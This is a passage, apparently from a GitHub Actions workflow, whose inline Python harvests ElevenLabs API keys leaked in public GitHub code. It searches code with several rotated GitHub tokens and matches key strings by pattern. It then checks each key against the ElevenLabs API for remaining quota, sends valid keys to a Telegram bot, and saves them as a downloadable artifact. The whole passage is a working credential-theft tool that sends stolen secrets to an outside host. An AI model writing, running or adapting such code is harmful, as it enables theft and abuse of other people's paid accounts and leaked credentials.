          # ---------- HARVEST CONSTANTS ----------
          PER_PAGE = 100
          MAX_PAGES = 5
          DELAY_BETWEEN_QUERIES = 3
          DELAY_BETWEEN_PAGES = 2
          DELAY_BETWEEN_VALIDATIONS = 0.5
          KEY_PATTERN = re.compile(r'(sk_[A-Za-z0-9]{32,})')
          ELEVENLABS_URL = 'https://api.elevenlabs.io/v1/user'

          # ---------- RATE LIMIT MANAGEMENT ----------
          token_limits = {t: {'remaining': 5000, 'reset': 0} for t in GITHUB_TOKENS}
          token_idx = 0

          def update_limits(token, headers):
              rem = headers.get('X-RateLimit-Remaining')
              reset = headers.get('X-RateLimit-Reset')
              if rem:
                  token_limits[token]['remaining'] = int(rem)
              if reset:
                  token_limits[token]['reset'] = int(reset)

          async def get_token():
              nonlocal token_idx
              now = time.time()
              for _ in range(len(GITHUB_TOKENS)):
                  t = GITHUB_TOKENS[token_idx % len(GITHUB_TOKENS)]
                  token_idx += 1
                  if token_limits[t]['remaining'] > 0 and now >= token_limits[t]['reset']:
                      return t
              wait = max(min(info['reset'] for info in token_limits.values()) - now, 5)
              await asyncio.sleep(wait)
              for t in GITHUB_TOKENS:
                  token_limits[t] = {'remaining': 5000, 'reset': time.time()}
              return GITHUB_TOKENS[0]

          async def search_github(session, token, query, page):
              url = 'https://api.github.com/search/code'
              params = {'q': query, 'per_page': PER_PAGE, 'page': page}
              headers = {'Authorization': f'token {token}'}
              async with session.get(url, headers=headers, params=params) as resp:
                  update_limits(token, resp.headers)
                  if resp.status == 200:
                      data = await resp.json()
                      return data.get('items', [])
                  elif resp.status == 403:
                      return None
                  else:
                      return []

          async def fetch_file_content(session, token, file_url):
              headers = {'Authorization': f'token {token}'}
              async with session.get(file_url, headers=headers) as resp:
                  if resp.status == 200:
                      data = await resp.json()
                      content = data.get('content', '')
                      if content:
                          try:
                              return base64.b64decode(content).decode('utf-8', errors='ignore')
                          except:
                              pass
                  return None

          async def validate_key(session, key):
              headers = {'xi-api-key': key}
              try:
                  async with session.get(ELEVENLABS_URL, headers=headers, timeout=15) as resp:
                      if resp.status == 200:
                          data = await resp.json()
                          sub = data.get('subscription', {})
                          limit = sub.get('character_limit', 0)
                          used = sub.get('character_count', 0)
                          return max(0, limit - used)
              except:
                  pass
              return None

          async def send_telegram(message):
              if BOT_TOKEN and CHAT_ID:
                  url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
                  payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
                  async with aiohttp.ClientSession() as session:
                      try:
                          await session.post(url, json=payload)
                      except:
                          pass

          async def harvest():
              valid_keys = {}
              total_queries = len(QUERIES)
              await send_telegram(f'🔍 Harvest started. {total_queries} queries, {MAX_PAGES} pages each.')

              async with aiohttp.ClientSession() as session:
                  for q_idx, query in enumerate(QUERIES, 1):
                      print(f'Query {q_idx}/{total_queries}: {query}')
                      token = await get_token()
                      for page in range(1, MAX_PAGES + 1):
                          items = await search_github(session, token, query, page)
                          if items is None:
                              print('Rate limit, sleeping 60s...')
                              await asyncio.sleep(60)
                              items = await search_github(session, token, query, page)
                              if items is None:
                                  print('Still limited, skipping query.')
                                  break
                          if not items:
                              break
                          print(f'  Page {page}: {len(items)} files')
                          page_keys = set()
                          for item in items:
                              content = await fetch_file_content(session, token, item['url'])
                              if content:
                                  keys = KEY_PATTERN.findall(content)
                                  page_keys.update(keys)
                              await asyncio.sleep(0.2)
                          if page_keys:
                              print(f'  Found {len(page_keys)} candidate keys')
                              for key in page_keys:
                                  quota = await validate_key(session, key)
                                  if quota is not None:
                                      valid_keys[key] = quota
                                      msg = f'✅ *VALID KEY!*\n`{key}`\n*Quota:* {quota:,} chars'
                                      await send_telegram(msg)
                                      print(f'  VALID: {key} (quota {quota})')
                                  await asyncio.sleep(DELAY_BETWEEN_VALIDATIONS)
                          await asyncio.sleep(DELAY_BETWEEN_PAGES)
                      await asyncio.sleep(DELAY_BETWEEN_QUERIES)

              # Sort and save with timestamp
              sorted_keys = sorted(valid_keys.items(), key=lambda x: x[1], reverse=True)
              timestamp = time.strftime('%Y%m%d_%H%M%S')
              filename = f'elevenlabs_keys_{timestamp}.txt'
              with open(filename, 'w') as f:
                  f.write(f'# ElevenLabs API Keys – harvested {timestamp}\n')
                  f.write('# Format: key:remaining_quota\n')
                  for k, q in sorted_keys:
                      f.write(f'{k}:{q}\n')

              summary = f'✅ Harvest finished. Valid keys: {len(sorted_keys)}. File: {filename}'
              print(summary)
              await send_telegram(summary)

          asyncio.run(harvest())
          "

      - name: Upload keys artifact
        uses: actions/upload-artifact@v4
        with:
          name: elevenlabs-keys
          path: elevenlabs_keys_*.txt
